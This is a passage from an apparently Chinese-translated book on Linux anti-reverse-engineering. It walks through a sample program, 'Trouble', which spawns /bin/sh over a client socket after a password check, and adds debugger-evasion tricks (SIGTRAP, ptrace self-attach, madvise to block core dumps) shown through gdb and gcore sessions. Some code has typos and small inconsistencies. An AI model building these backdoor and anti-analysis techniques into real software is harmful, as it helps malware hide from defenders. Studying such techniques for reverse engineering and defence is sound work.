
`rc4_init(&state, check_password_key, sizeof(check_password_key));`

`rc4_crypt(&state, (unsigned char*)check_password, (unsigned char*)check_password, (uint64_t)password_size);`

```c
mprotect(check_password, (uint64_t)password_size, PROT_READ | PROT_EXEC);

if (check_password(password_input)) {

    close(client_sock);

    exit(EXIT_FAILURE);

}

dup2(client_sock, 0);

dup2(client_sock, 1);

dup2(client_sock, 2);

char* empty[] = { NULL };

char* binsh[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };

execve(binsh, empty);

close(client_sock);

exit(EXIT_SUCCESS);
```

```c
int main(int p_argc, char* p_argv[])

{

    (void)p_argc;

    (void)p_argv;

    // 注册处理 SIGTRAP 的 trap 函数

    struct sigaction sVal = {};

    sVal.sa_flags = SA_SIGINFO;

    sVal.sa_sigaction = trap_handler;

    sigaction(SIGTRAP, &sVal, NULL);

    // 生成 sigtrap

    kill(getpid(), SIGTRAP);

    return EXIT_SUCCESS;

}
```
如果你在 GDB 中运行此版本的 Trouble，它将在调用 `trap_handler()` 前退出。

## Trouble 在 SIGTRAP 后提前退出

```
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dpantpanic/build$ gdb ./trouble/trouble
```
GNU gdb (Ubuntu 7.11.1-0ubuntu.14) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPL3+: GNU gdb version 3 or later <http://www.gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
http://www.gnu.org/software/gdb/bugs/.
Find the GDB manual and other documentation resources online at:
http://www.gnu.org/software/gdb/documentation/..
For help, type "help".
Type "apropos word" to search for commands related to "word"
Reading symbols from ./trouble/trouble... (no debugging symbols found)...done.

```
(gdb) start

Temporary breakpoint 1 at 0x4005b1

Starting program: /home/albino-lobster/antire_book/chap_6_debugger/dpantpanic/build/trouble

Temporary breakpoint 1, 0x0000000000004005b1 in main ()

(gdb) c

Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.

0x00000000000040cd9 in kill ()

(gdb) c

Continuing.

[Inferior 1 (process 84663) exited normally

(gdb)
```

如上所示，GDB 接收到了 SIGTRAP 但没有将其传递给 Trouble，因此执行了 `trap_handler()`。

但这种技术存在一个问题。如果调试器在生成 SIGTRAP 后附加到 Trouble，它将无法被检测。在下面的示例中，`gcore` 生成 core 文件没有问题。遗憾的是，我们的 SIGTRAP 方法几乎什么做不了阻止这一点。即使你生成了更多的 SIGTRAP 信号，这种方法也无法阻止其他进程的附加。

## 附加

另一种著名方法是在派生的子进程中使用 `PTRACE_ATTACH`。考虑 Trouble 的以下更改：

Trouble 更新为跟踪自身

```c
int main(int p_argc, char* p_argv[])

{

    (void)p_argc;

    (void)p_argv;

    int child_pid = fork();

    if (child_pid == 0)

    {

        // 跟踪父进程

        if (ptrace(PTRACE_ATTACH, getpid(), NULL, NULL) != 0) {

            exit(EXIT_FAILURE);

        }prace(PTRACE_SETOPTIONS, getpid(), NULL, PTRACE_O_TRACEFORK);

    // 重启父进程以便能够像往常一样继续处理

}
```

```c
int status = 0;

wait(&status);

ptrace(PTRACE_CONT, getppid(), NULL, NULL);

// 处理被追踪者可能产生的任何信号

while (true) {

    int pid = wait(&status);

    if (status >> 16 == PTRACE_EVENT_FORK) {

        // 跟进 fork 操作

        long newpid = 0;

        ptrace(PTRACE_GETEVENTMSG, newpid, NULL, NULL, &newpid);

        ptrace(PTRACE_ATTACH, newpid, NULL, NULL);

        ptrace(PTRACE_CONT, newpid, NULL, NULL);

    }

}
```

上面的代码将 `fork()` 出子进程，该进程通过 `PTRACE_ATTACH` 成为父进程 Trouble进程的追踪器。它还会自动开始追踪由于 `PTRACE_SETOPS` 调用引起的任何 fork 操作。这在很大程度上解决了我们在 `PTRACEME` 方法上遇到的问题，因为我们现在知道了追踪程序是谁：Trouble！这也解决了我们在 `SIGTRAP` 上遇到的问题。没有人能简单附加到 Trouble 主进程，因为它正被子进程追踪。

然而，这种方法确实存在问题：

- 1. 任何人都可以附加到追踪 Trouble 的子进程。
- 2. 如果 fork 出追踪器被杀死，主进程将无法感知。
- 3. 使用 `PTRACE_ATTACH` 需要提升权限。

第二点的示例例如所示：

## 第 6 章：逃避调试器

## 为了生成 core 文件而杀死子进程

```bash
albino-lobster@ubuntu:-$ ps fa

PID TTY  STAT TIME COMMAND

6352 pts/21 Ss    0:00 bash

6956 pts/21 R+    0:00 \_ ps fa

6230 pts/9  Ss    0:00 bash

6942 pts/9  S    0:00 \_ sudo su

6943 pts/9  S    0:00 \_ su

6944 pts/9  S    0:00 \_ ./trouble/trouble

6954 pts/9  S+   0:00 \_ ./trouble/trouble

6955 pts/9  S+   0:00

albino-lobster@ubuntu:-$ sudo gcore 6954
```

无法附加到进程。如果你的 uid 与目标进程的 uid 匹配，请检查 /proc/sys/kernel/yama/ptrace_scope 的设置，或尝试作为 root 用户重试。更多详情请参阅 /etc/sysctl.d/10-ptrace.conf。警告：进程 6954 已被进程 6955 追踪
ptrace: 操作不允许。

如果没有待调试的进程，你无法操作。
程序没有运行。

```bash
gcore: failed to create core.6954

albino-lobster@ubuntu:-$ sudo kill -9 6954

albino-lobster@ubuntu:-$ sudo gcore 6954

0x00000000000401328 in __syscall ()
```

已保存 corefile.6954
albino-lobster@ubuntu:-$

如你所示，在进程 6955 被杀死之前，gcore 无法为 6955 创建 core 文件。然而，在执行 `sudo kill -9 6955` 后，gcore 能够产生 core 文件。

不过，你可以通过使用 ptrace 选项 `PTRACE_O_EXITKILL` 轻松修复这个问题。这会在追踪器被杀死时，向所有被追踪者发送 `SIGKILL` 信号。你可以更新代码如下：

```c
ptrace(PTRACE_SETOPTIONS, getppid(), NULL, PTRACE_TRACEFORK | PTRACE_O_EXITKILL);
```

现在，如果攻击者尝试杀死追踪器 Trouble，Trouble 将直接消失。

## 第 6 章：逃避调试器

```bash
albino-lobster@ubuntu:~$ ps fa
```
PID TTY     STAT TIME COMMAND
6352 pts/21 Ss     0:00 bash
7071 pts/21 R+     0:00 _ ps fa
6230 pts/9  Ss     0:00 bash
7041 pts/9  S      0:00 _ sudo su
7042 pts/9  S      0:00 _ su
7043 pts/9  S      0:00 _ bash
7068 pts/9  S+     0:00 _ ./trouble/trouble
7069 pts/9  S+     0:00 _ ./trouble/trouble
```

albino-lobster@ubuntu:~$ sudo gcore 7068

无法附加到进程。如果你的 uid 与目标进程的 uid 匹配，请检查 /proc/sys/kernel/yama/ptrace_scope 的设置，或尝试作为 root 用户重试。更多详情请参阅 /etc/sysctl.d/10-ptrace.conf。警告：进程 7068 已被进程 7069 追踪

ptrace: 操作不允许。

如果没有待调试的进程，你无法操作。

程序没有运行。

gore: failed to create core.7068

albino-lobster@ubuntu:~$ sudo kill 7069

albino-lobster@ubuntu:~$ sudo gcore 7068

ptrace: 无该进程。

## madvise

在上一节中，你介绍了一种检测调试器是否已附加到 Trouble-tracing 子进程的新方法。然而，该方法无法防止诸如 `gcore` 这种在不控制执行的情况下进行附加并脱离的工具。

`gcore` 仍然能够附加到 Trouble-tracing 子进程：

```
albino-lobster@ubuntu:~$ ps fa
PID TTY      STAT TIME COMMAND
6369 pts/29 Ss+       0:00 bash
6352 pts/21 Ss        0:00 bash
16614 pts/21 R+       0:00  _ _ fa
6230 pts/9 Ss        0:00 bash
16611 pts/9 S+       0:00  _ ./trouble/trouble
16612 pts/9 S+       0:00  _ ./trouble/trouble
16613 pts/9 S+       0:00  _ ./trouble/trouble
albino-lobster@ubuntu:~$ sudo gcore 16613
0x000000000000402374 in __syscall ()
Saved core.16613
```

正如之前提到的，核心文件可以加载到 IDA 中，并提供一个去除了许多混淆的 Trouble 视图。然而，Linux 中有一个名为 `madvise()` 的函数，它允许我们将某些内存范围排除在核心文件之外。`madvise()` 系统调用用于向内核从 `addr` 开始长度为 `size` 字节的地址范围提供建议。需要注意的是，尽管 `madvise()` 未在 POSIX 中规定，但随后添加了许多 Linux 特有的建议值。

其中一个“Linux 特有的建议值”是 `MADV_DONTUMP`。再次参考 `madvise()` 的说明：从核心转储中排除由 addr 和长度指定的范围内的那些内存页。这对于具有大面积内存且已知这些内存在核心转储中没有用处的应用程序非常有用。MADV_DONTUMP 的效果优于通过 `/proc/PID/coredump_filter` 设置的位掩码。通过使用 `madvise()`，你可以防止 gdb 转储 Trouble。唯一的挑战是程序化地找到传递给 `madvise()` 的地址。为了实现这一点，我创建另一个编译后工具。该项目包含两个文件：

### CMakeLists.txt

```cmake
cmake_minimum_required(VERSION 3.0)
project(madvise)

set(CMAKE_CXX_FLAGS "-Wall -extra -g")

add_executable(${PROJECT_NAME} src/madvise.cpp)
```

### madvise.cpp
